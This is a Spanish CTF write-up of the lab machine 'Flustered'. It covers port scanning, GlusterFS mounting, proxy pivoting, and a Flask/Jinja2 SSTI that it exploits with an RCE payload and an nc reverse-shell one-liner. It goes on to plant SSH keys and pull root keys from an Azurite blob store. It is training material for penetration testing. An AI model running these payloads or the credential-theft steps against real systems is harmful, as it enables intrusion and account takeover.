---
layout: post
title: "Flustered"
date: 2026-02-19 10:00:00
categories: writeups
tags: [glusterFS, squid, squidProxy, user pivoting, internal enum, Azure Storage pentesting]
lang: es
---
# Información general
> Nombre			: Flustered
> Sistema operativo : Linux
> Dificultad		: Media

# Conceptos vistos en la máquina
```
- Montaje de GlusterFS volume
- Uso de SquidProxy para descubrir apps interna
- SSTI para ganar acceso inicial
- Extracción de certificados de gluster para montarnos vol1 y creacion de ssh-keys para pivotar de usuario
- Enumeración de red interna docker
- Interacción con Azure Storage
[*] Bonus
	- Como hacer que funcione el Azure Storage
	- Set de SquidProxy con FoxyProxy
```

# Enumeration & Initial Foothold

>📍IP
>```
>10.10.11.131
>```

>🔐 Usuarios/Contraseñas
```
lance.friedman:o>WJ5-jD<5^m3
```

>🪪 Dominios
```
flustered.htb
steampunk-era.htb
flustered
```
## 🔎 Escaneo Nmap

```python
nmap -p- -sS -Pn -n -vvv --min-rate 3000 -oG all-Ports 10.10.11.131
```

```
nmap --top-ports=300 -sU -vvv -oG UDP-Ports 10.10.11.131
```

```
nmap -p -sCV -vvv -oN Targeted  10.10.11.131  
```

```python
PORT      STATE SERVICE     VERSION
22/tcp    open  ssh         OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 93:31:fc:38:ff:2f:a7:fd:89:a3:48:bf:ed:6b:97:cb (RSA)
|   256 e5:f8:27:4c:38:40:59:e0:56:e7:39:98:6b:86:d7:3a (ECDSA)
|_  256 62:6d:ab:81:fc:d2:f7:a1:c1:9d:39:cc:f2:7a:a1:6a (ED25519)
80/tcp    open  http        nginx 1.14.2
|_http-server-header: nginx/1.14.2
|_http-title: steampunk-era.htb - Coming Soon
111/tcp   open  rpcbind     2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|_  100000  3,4          111/udp6  rpcbind
3128/tcp  open  http-proxy  Squid http proxy 4.6
|_http-server-header: squid/4.6
|_http-title: ERROR: The requested URL could not be retrieved
24007/tcp open  rpcbind
49152/tcp open  ssl/unknown
| ssl-cert: Subject: commonName=flustered.htb
| Not valid before: 2021-11-25T15:27:31
|_Not valid after:  2089-12-13T15:27:31
|_ssl-date: TLS randomness does not represent time
49153/tcp open  rpcbind
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 40.31 seconds
```


## 80 - HTTP

Lanzamos el whatweb para ver información acerca de las tecnologías en uso, vemos un subdominio

![]({{ "/assets/images/flustered/Pasted image 20251105181431.png" | relative_url }})

En la web no hay nada de nada

## 111 - RPC

![]({{ "/assets/images/flustered/Pasted image 20251105181841.png" | relative_url }})

## 3128 - SQUID

Accedemos via URL

![]({{ "/assets/images/flustered/Pasted image 20251105182136.png" | relative_url }})

Probamos a hacer una petición empleando este proxy con curl, y viendo las cabeceras, observamos que necesita de una autenticación

![]({{ "/assets/images/flustered/Pasted image 20251105182632.png" | relative_url }})


```
curl http://user:pass@flustered.htb:3128 http://flustered.htb --head
```

Empleamos la herramienta spose para enumerar puertos haciendo uso del proxy que pueda tener abiertos de manera interna que si no es pasando por el proxy, no se ven

[spose](https://github.com/aancw/spose)

Lo ejecutamos pasando por la URL las credenciales que hemos enumerado

## 24007, 49152 -  GlusterFS

Encontramos que es un sistema de comparticion de ficheros, basicamente un NFS, así que, enumeramos los volúmenes con gluster

![]({{ "/assets/images/flustered/Pasted image 20251105191227.png" | relative_url }})

Vemos que hay 2, intentaremos montarlos en nuestro sistema para ver que contienen

![]({{ "/assets/images/flustered/Pasted image 20251105191311.png" | relative_url }})

Nos esta reventando porque esta dando un resolution failed a flustered

![]({{ "/assets/images/flustered/Pasted image 20251105191451.png" | relative_url }})

Actualizamos el /etc/hosts y probamos de nuevo

![]({{ "/assets/images/flustered/Pasted image 20251105191538.png" | relative_url }})

Comprobamos que podemos montarnos el vol2 y vemos archivos, enumeramos los importantes

Encontramos un archivo .ibd, que suele almacenar contraseñas, en este caso, serían de un usuario del squid proxy

![]({{ "/assets/images/flustered/Pasted image 20251105192115.png" | relative_url }})

```
lance.friedman:o>WJ5-jD<5^m3
```

Nos configuramos un proxy en foxyproxy para poder hacer uso de este proxy y estas credenciales

![]({{ "/assets/images/flustered/Pasted image 20251105195554.png" | relative_url }})


Ahora, al pasar por este proxy, no tenemos que acceder ni a la IP ni nada, porque las peticiones van desde el proxy, así que probamos a usar `127.0.0.1` y vemos que la página cambia, lo que nos hace pensar en que es posible que haya rutas internas, fuzzeamos por rutas


```
curl -x http://lance.friedman:o>WJ5-jD<5^m3@flustered.htb:3128 http://127.0.0.1
```

![]({{ "/assets/images/flustered/Pasted image 20251105195516.png" | relative_url }})

Fuzzeamos rutas, *IMPORTANTE, como la contraseña tiene caracteres especiales como <, hay que URLencodearlo*

```
gobuster dir -u http://127.0.0.1 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt --proxy "http://lance.friedman:o%3EWJ5-jD%3C5%5Em3@flustered.htb:3128"
```

Encontramos una ruta `/app`, volvemos a fuzzear dentro de ella filtrando por extensiones de archivo, como `.py y .php` , y encontramos otras 3 rutas, `/templates`, `/static` y `/config`, y un `app.py` que nos devuelve un 200

![]({{ "/assets/images/flustered/Pasted image 20251105201522.png" | relative_url }})


Al acceder, nos descarga el codigo, que es el siguiente

```
from flask import Flask, render_template_string, url_for, json, request
app = Flask(__name__)

def getsiteurl(config):
  if config and "siteurl" in config:
    return config["siteurl"]
  else:
    return "steampunk-era.htb"

@app.route("/", methods=['GET', 'POST'])
def index_page():
  # Will replace this with a proper file when the site is ready
  config = request.json

  template = f'''
    <html>
    <head>
    <title>{getsiteurl(config)} - Coming Soon</title>
    </head>
    <body style="background-image: url('{url_for('static', filename='steampunk-3006650_1280.webp')}');background-size: 100%;background-repeat: no-repeat;"> 
    </body>
    </html>
  '''
  return render_template_string(template)

if __name__ == "__main__":
  app.run()
```

Observamos que está intentando cargar una "configuracion" de un parametro config, y si no hay nada, muestra el `steampunk-era.htb`

Analizando el codigo, recibe los datos de una petición POST de un parámetro `siteurl` y lo muestra, pero está sin sanitizar correctamente, lo que puede significar que sea vulnerable a un SSTI, probamos a mandarle un payload tipico, como `{{ 7 * 7 }}` y si lo interpreta, será vulnerable

```
curl -X POST -H "Content-Type: application/json" -d '{"siteurl": "{{ 7 * 7 }}"}' http://10.10.11.131/
```


![]({{ "/assets/images/flustered/Pasted image 20251105202130.png" | relative_url }})


Vemos que se acontece el ataque, nos pasamos la petición a burpsuite con `-x http://127.0.0.1:8080` y ejecutaremos un RCE

```
"siteurl"="{% raw %}{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}{% endraw %}"
```

![]({{ "/assets/images/flustered/Pasted image 20251105202455.png" | relative_url }})


Nos mandaremos una reverse shell

```
"siteurl"="{% raw %}{{ self.__init__.__globals__.__builtins__.__import__('os').popen('/usr/bin/nc 10.10.14.6 6666 -e /bin/bash').read() }}{% endraw %}"
```

![]({{ "/assets/images/flustered/Pasted image 20251105202628.png" | relative_url }})

# Privesc

Enumeramos cosas basicas de la máquina, descubrimos un usuario llamado `jeniffer`

![]({{ "/assets/images/flustered/Pasted image 20251105202733.png" | relative_url }})

El vol1 es propiedad de jennifer

![]({{ "/assets/images/flustered/Pasted image 20251105203737.png" | relative_url }})

Lanzamos el linpeas para enumerar información relevante

![]({{ "/assets/images/flustered/Pasted image 20251105204239.png" | relative_url }})

Este glusterfs.pem lo hemos visto antes, al ir a montar el vol1 no nos dejó montarlo debido al siguiente error

![]({{ "/assets/images/flustered/Pasted image 20251105203956.png" | relative_url }})


Nos bajamos el certificado, lo movemos a la ruta de donde lo esta llamando, `/etc/ssl` y probamos a montarnos el volumen, y nos vuelve a dar error, pidiendo el .key

![]({{ "/assets/images/flustered/Pasted image 20251105204702.png" | relative_url }})

Como nos va a pedir todos, nos bajamos todos y los metemos en `/etc/ssl` y ahora nos deja montarnos el volumen 

![]({{ "/assets/images/flustered/Pasted image 20251105204915.png" | relative_url }})

Observamos que es el /home de jennifer, si podemos escribir nos creamos unas ssh keys y nos loguearemos

![]({{ "/assets/images/flustered/Pasted image 20251105205148.png" | relative_url }})

![]({{ "/assets/images/flustered/Pasted image 20251105205201.png" | relative_url }})

Y ya tenemos acceso como jennifer con ssh

![]({{ "/assets/images/flustered/Pasted image 20251105205225.png" | relative_url }})

Encontramos un archivo en var backups que se llama key, que podemos leer, ademas de varios backups

![]({{ "/assets/images/flustered/Pasted image 20251106084655.png" | relative_url }})

Dentro de la máquina, enumeramos y vemos que hay una interfaz nueva, así que enumeraremos los hosts que hay en ella, es una red de docker

![]({{ "/assets/images/flustered/Pasted image 20251106091510.png" | relative_url }})

Usaremos los scripts que usamos para enumerar en DMZ01, lo editamos un poco para que abarque todos los hosts de la red y lo lanzamos

![]({{ "/assets/images/flustered/Pasted image 20251106095226.png" | relative_url }})

Encontramos un host, nos montamos un tunel con el ligolo y escanearemos los puertos

![]({{ "/assets/images/flustered/Pasted image 20251106100016.png" | relative_url }})

Encontramos el puerto 10000 abierto, probamos a acceder y nos da un error

![]({{ "/assets/images/flustered/Pasted image 20251106100125.png" | relative_url }})

Buscando el error en google, vemos que se trata de un Azure Storage

![]({{ "/assets/images/flustered/Pasted image 20251106100247.png" | relative_url }})

En particular, viendo las cabeceras, vemos que se trata de un Azurite Blob

![]({{ "/assets/images/flustered/Pasted image 20251106100402.png" | relative_url }})


Nos bajaremos la herramienta `storage-explorer` con snap para enumerar este container de azure, tendremos en cuenta la key que hemos visto antes de jennifer por si nos la piden, la hemos encontrado con el linpeas en `/var/backups`


```
FMinPqwWMtEmmPt2ZJGaU5MVXbKBtaFyqP0Zjohpoh39Bd5Q8vQUjztVfFphk73+I+HCUvNY23lUabd7Fm8zgQ==
```

Instalamos el storage-explorer y añadimos la linea de abajo segun la documentacion

```
sudo apt update
sudo apt install snapd
sudo systemctl start snapd
sudo snap install storage-explorer
snap connect storage-explorer:password-manager-service :password-manager-service
```

Dentro, no nos vale con tener el tunel, asi que nos forwardearemos el puerto localmente para que acceda de manera local

![]({{ "/assets/images/flustered/Pasted image 20251106102209.png" | relative_url }})

![]({{ "/assets/images/flustered/Pasted image 20251106102235.png" | relative_url }})

Al ir a acceder, nos da un error

```
ProducerError:{
  "name": "RestError",
  "message": "{\"name\":\"RestError\",\"code\":\"InvalidHeaderValue\",\"statusCode\":400,\"details\":{\"errorCode\":\"InvalidHeaderValue\",\"connection\":\"keep-alive\",\"content-type\":\"application/xml\",\"date\":\"Thu, 06 Nov 2025 09:24:18 GMT\",\"keep-alive\":\"timeout=5\",\"server\":\"Azurite-Blob/3.14.3\",\"transfer-encoding\":\"chunked\",\"x-ms-request-id\":\"bdaf7a86-04a4-43c6-bb4a-cd146bed27a4\",\"message\":\"The value for one of the HTTP headers is not in the correct format.\\nRequestId:bdaf7a86-04a4-43c6-bb4a-cd146bed27a4\\nTime:2025-11-06T09:24:18.402Z\",\"code\":\"InvalidHeaderValue\",\"HeaderName\":\"x-ms-version\",\"HeaderValue\":\"2025-07-05\"}}"
}
```

*Da un puto coñazo, nos tenemos que montar una ubuntu para instalar la mierda del storage explorer, por la version de la API*

Para resolver este calvario, simplemente tenemos que declarar la variable de entorno, con la version de la api que acepta esta version del azurite, que es la 2023-11-03

```
export AZURE_STORAGE_API_VERSION=2023-11-03
```

Para que sea la valida, y lanzar el `storage-explorer`, y ya veremos que hay una carpeta de `ssh-keys`

![]({{ "/assets/images/flustered/Pasted image 20251106121643.png" | relative_url }})

Cogemos la de root y nos autenticamos por SSH

![]({{ "/assets/images/flustered/Pasted image 20251106121838.png" | relative_url }})

![]({{ "/assets/images/flustered/Pasted image 20251106121909.png" | relative_url }})



